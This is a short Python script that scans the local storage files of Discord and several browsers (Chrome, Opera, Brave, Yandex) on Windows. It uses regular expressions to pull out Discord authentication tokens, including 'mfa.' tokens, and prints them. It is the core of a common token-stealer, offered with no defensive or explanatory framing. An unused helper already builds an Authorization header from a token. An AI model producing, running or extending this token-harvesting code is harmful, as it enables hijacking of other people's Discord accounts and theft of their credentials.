import os
from re import findall

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")


APPLICATION_PATHS = {
    "Discord": os.path.join(ROAMING, "Discord"),
    "Discord Canary": os.path.join(ROAMING, "discordcanary"),
    "Discord PTB": os.path.join(ROAMING, "discordptb"),
    "Google Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data", "Default"),
    "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
    "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
    "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data", "Default")
}


def get_tokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if file_name.endswith(".log") or file_name.endswith(".ldb"):
            with open(os.path.join(path, file_name), errors="ignore") as f:
                for line in f:
                    if line.strip():
                        tokens.extend(findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", line))
                        tokens.extend(findall(r"mfa\.[\w-]{84}", line))
    return tokens


def get_header(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type
    }
    if token:
        headers["Authorization"] = token
    return headers


def main():
    all_tokens = []

    for app, path in APPLICATION_PATHS.items():
        if os.path.exists(path):
            for token in get_tokens(path):
                all_tokens.append(token)

    print(f"Found Tokens: {len(all_tokens)}")
    print("\n".join(all_tokens))


if __name__ == "__main__":
    main()
